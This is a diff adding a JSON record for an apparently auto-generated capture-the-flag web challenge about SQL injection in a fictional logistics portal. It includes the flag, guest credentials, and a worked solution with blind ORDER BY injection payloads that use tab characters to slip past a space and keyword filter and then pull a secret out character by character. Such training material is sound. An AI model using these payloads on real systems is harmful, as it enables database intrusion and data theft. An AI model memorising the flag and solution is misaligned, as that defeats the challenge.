@@ -1,0 +1,49 @@
+{
+  "run_number": 16,
+  "arm": "sage",
+  "terminal_state": "COMPLETE",
+  "quality_score": 95.0,
+  "calibrated_difficulty": 1.65,
+  "target_difficulty": 1.5,
+  "category": "sqli",
+  "challenge_type": "web",
+  "title": "Aetheris Manifest Shadow",
+  "description": "Welcome to the Aetheris Logistics Internal Portal. As a junior logistics officer, you have access to the shipment tracking system. We are currently auditing our legacy manifest reporting tools. Explore the system, find the legacy manifest API, and see if you can retrieve the system's integrity checksums\u2014one of which is rumored to be a highly classified administrative flag.",
+  "flag": "LEVELUP{MOkCJr08R9gIzH3NyBrq24RxmL3HYXHL}",
+  "solution": "1. Access the application and log in with the provided guest credentials (guest / guest123).\n2. Navigate to the 'Shipments' page and view the details of any shipment.\n3. Inspect the page source or search for scripts to find a hint about the legacy API: `/api/v1/reports/legacy_manifest`.\n4. Access `/api/v1/reports/legacy_manifest?order_by=id` and observe the JSON output.\n5. Test for SQL injection in the `order_by` parameter. Attempting `order_by=id DESC` fails due to a space filter.\n6. Bypass the space filter using a tab character (`%09`). `order_by=id%09DESC` works.\n7. Use a CASE statement for blind SQL injection: `order_by=(CASE%09WHEN%09(1=1)%09THEN%09weight%09ELSE%09id%09END)`. Since weights and IDs are different, the sort order changes based on the condition.\n8. Enumerate the database schema using `sqlite_master`. Discover the table `system_internal_state` and column `state_blob`.\n9. Extract the flag from the 24th row of `system_internal_state` (the 'maintenance_token') using `substr` and character-by-character comparison: `order_by=(CASE%09WHEN%09(substr((SELECT%09state_blob%09FROM%09system_internal_state%09LIMIT%091%09OFFSET%0923),1,1)='L')%09THEN%09weight%09ELSE%09id%09END)`.\n10. Automate the extraction to retrieve the full flag.",
+  "docker_image_tag": "levelup-challenge-e6ed3316",
+  "narrative_context": {
+    "company_name": "Aetheris Logistics",
+    "industry": "logistics",
+    "scenario": "Aetheris Logistics is a global leader in high-value asset transport, managing everything from rare art pieces to sensitive medical isotope shipments. Following a recent acquisition of a regional competitor, the company is frantically integrating various legacy tracking systems into their primary enterprise stack. The centralized security team is currently overwhelmed by the sheer volume of compliance audits required for this transition.\n\nAs part of this integration, the 'Vanguard Nexus Trace' platform has been flagged for a secondary review. While the system appears robust on the surface, the rapid migration of legacy database schemas has raised concerns about how user-inputted queries are handled within the core search modules. You have been brought in to evaluate the integrity of these search interfaces before they are fully exposed to the global partner network.",
+    "app_name": "Vanguard Nexus Trace",
+    "app_purpose": "Internal shipment tracking and historical manifest search engine.",
+    "data_theme": "Shipment IDs, cargo descriptions, destination coordinates, and customs officer signatures.",
+    "flavor_details": {
+      "company_motto": "Precision in Motion, Security in Every Mile.",
+      "department": "Global Operations & Asset Protection",
+      "recent_event": "Post-merger infrastructure consolidation and legacy system migration.",
+      "tech_hints": [
+        "Spring Boot framework",
+        "Relational database backend",
+        "Dynamic query parameters"
+      ]
+    }
+  },
+  "calibration_notes": "Source analysis: The challenge requires an ORDER BY injection while bypassing a WAF that filters spaces and multiple keywords (UNION, WHERE, AND, OR). Exploitation requires a blind-boolean approach using CASE statements and subqueries with LIMIT/OFFSET (to avoid WHERE) and whitespace alternatives like tabs (%09) or parentheses to bypass the filter. (target was 1.5)",
+  "verification_level": "smoke_tested",
+  "static_analysis_passed": true,
+  "smoke_test_passed": true,
+  "pipeline_states": [
+    "INIT",
+    "NARRATIVE",
+    "GENERATE",
+    "STATIC_ANALYSIS",
+    "VALIDATE",
+    "CALIBRATE",
+    "SMOKE_TEST",
+    "QUALITY_SCORE",
+    "DEPLOY",
+    "COMPLETE"
+  ]
+}
